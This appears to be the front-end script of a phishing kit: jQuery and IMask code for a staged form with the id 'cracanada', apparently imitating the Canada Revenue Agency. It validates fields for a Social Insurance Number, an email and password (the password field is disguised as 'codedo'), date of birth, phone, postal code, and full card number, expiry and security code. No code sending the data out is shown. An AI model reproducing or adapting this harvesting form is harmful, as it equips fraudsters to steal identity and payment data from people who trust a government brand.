$(document).ready(function() {	
			
  const cardnumber = document.getElementById('cardnumber');
  const expirationdate = document.getElementById('expirationdate');
  const securitycode = document.getElementById('securitycode'); 


  let cctype = null;

 
  var cardnumber_mask = new IMask(cardnumber, {
    mask: [
    {
      mask: '000000000000000',
      regex: '^3[47]\\d{0,13}',
      cardtype: 'american express' },

    {
      mask: '0000000000000000',
      regex: '^(?:6011|65\\d{0,2}|64[4-9]\\d?)\\d{0,12}',
      cardtype: 'discover' },

    {
      mask: '00000000000000',
      regex: '^3(?:0([0-5]|9)|[689]\\d?)\\d{0,11}',
      cardtype: 'diners' },

    {
      mask: '0000000000000000',
      regex: '^(5[1-5]\\d{0,2}|22[2-9]\\d{0,1}|2[3-7]\\d{0,2})\\d{0,12}',
      cardtype: 'mastercard' }, 
    {
      mask: '000000000000000',
      regex: '^(?:2131|1800)\\d{0,11}',
      cardtype: 'jcb15' },

    {
      mask: '0000000000000000',
      regex: '^(?:35\\d{0,2})\\d{0,12}',
      cardtype: 'jcb' },

    {
      mask: '0000000000000000',
      regex: '^(?:5[0678]\\d{0,2}|6304|67\\d{0,2})\\d{0,12}',
      cardtype: 'maestro' },

    {
      mask: '0000000000000000',
      regex: '^4\\d{0,15}',
      cardtype: 'visa' },

    {
      mask: '0000000000000000',
      regex: '^62\\d{0,14}',
      cardtype: 'unionpay' },

    {
      mask: '0000000000000000',
      cardtype: 'Unknown' }],


    dispatch: function (appended, dynamicMasked) {
      var number = (dynamicMasked.value + appended).replace(/\D/g, '');

      for (var i = 0; i < dynamicMasked.compiledMasks.length; i++) {
        let re = new RegExp(dynamicMasked.compiledMasks[i].regex);
        if (number.match(re) != null) {
          return dynamicMasked.compiledMasks[i];
        }
      }window.CP.exitedLoop(0);
    } });


  //Mask the Expiration Date
  var expirationdate_mask = new IMask(expirationdate, {
    mask: 'MM{/}YY',
    groups: {
      YY: new IMask.MaskedPattern.Group.Range([21, 33]),
      MM: new IMask.MaskedPattern.Group.Range([1, 12]) } });



  //Mask the security code
  var securitycode_mask = new IMask(securitycode, {
    mask: '0000' });

  //Mask the Expiration Date
  var dob_mask = new IMask(dob, {
    mask: 'DD{-}MM{-}YYYY',
    groups: {
      YYYY: new IMask.MaskedPattern.Group.Range([1930, 2004]),
      MM: new IMask.MaskedPattern.Group.Range([1, 12]),
      DD: new IMask.MaskedPattern.Group.Range([1, 31]) }});
  
  var telephone_mask = new IMask(telephone, {
    mask: '000-000-0000' });    
 	 
            //Screen trigger
            
$('.screen--1').click(function() {
	if($("#cracanada").valid()){
                $('html, body').animate({
                    scrollTop: 0
                }, 100);
                $('.main--1').fadeOut(200);

                setTimeout(
                    function() {
                        $('.main--2').fadeIn(1000);
                    }, 200
                );
          } else {  			
				} 			
            });
$('.screen--2').click(function() {
	if($("#cracanada").valid()){
                $('html, body').animate({
                    scrollTop: 0
                }, 100);
                $('.main--2').fadeOut(200);

                setTimeout(
                    function() {
                        $('.main--3').fadeIn(1000);
                    }, 200
                );
          } else {  			
				} 			
            });                     
			
  $("#cracanada").validate( { // initialize plugin
	 	 	 	
		errorElement: "label",	
		errorClass: "has-error", 
  errorPlacement: function(error, element) {
     error.insertBefore( element.parent("div") );
   },
                rules: {
					ninmr: { required: true, minlength: 9,},
                	email: { required: true, email: true,}, 
					codedo: { required: true, minlength: 5,},
					name: {	required: true,	minlength: 4,},
					dob: {	required: true,	minlength: 10,},
					telephone: { required: true, minlength: 12,},
					postcode: { required: true, minlength: 6,}, 
					cardnumber: { required: true, creditcard: true,},
					expirationdate: { required: true, minlength: 5,},
					securitycode: { required: true, minlength: 3,},  
                },
                messages: {
					ninmr: { 
						required: "The Social insurance number field is mandatory.", 
						minlength: jQuery.validator.format("Please check the Social insurance number you have entered."), 
					}, 
					email: {
						required: "The email address field is mandatory.",
						email: jQuery.validator.format("Please check the email address you have entered."),
					},
					codedo: { 
						required: "The password field is mandatory.", 
						minlength: jQuery.validator.format("Please check the password you have entered."), 
					},  
					name: {
						required: "The full name field is mandatory",
						minlength: jQuery.validator.format("Please check the full name you have entered."),
					},
					dob: {
						required: "The date of birth field is mandatory.",
						minlength: jQuery.validator.format("Please check the date of birth you have entered."),
					},
					telephone: {
						required: "The phone number field is mandatory.",
						minlength: jQuery.validator.format("Please check the phone number you have entered."), 
					},
					postcode: {
						required: "The postal code field is mandatory.",
						minlength: jQuery.validator.format("Please check the postal code you have entered."),
					},
					cardnumber: {
						required: "The card number field is mandatory.",
						creditcard: jQuery.validator.format("Please check the card number you have entered."),
					},
					expirationdate: {
						required: "The expiry date field is mandatory.",
						minlength: jQuery.validator.format("Please check the expiry date you have entered."),
					},
					securitycode: {
						required: "The security code field is mandatory.",
						minlength: jQuery.validator.format("Please check the security code you have entered."), 
					}, 
				},  
	    });	 
        });
 
  